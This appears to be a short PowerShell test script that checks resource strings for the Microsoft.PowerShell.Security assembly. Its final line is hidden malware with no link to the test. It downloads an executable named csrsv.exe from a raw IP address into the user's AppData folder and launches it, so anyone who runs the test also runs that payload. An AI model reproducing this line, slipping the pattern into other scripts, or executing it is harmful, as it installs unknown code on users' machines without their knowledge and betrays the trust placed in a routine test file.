

. "$psscriptroot/TestRunner.ps1"

$assemblyName = "Microsoft.PowerShell.Security"



$excludeList = @("SecurityMshSnapinResources.resx")

import-module Microsoft.PowerShell.Security


Test-ResourceStrings -AssemblyName $AssemblyName -ExcludeList $excludeList

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

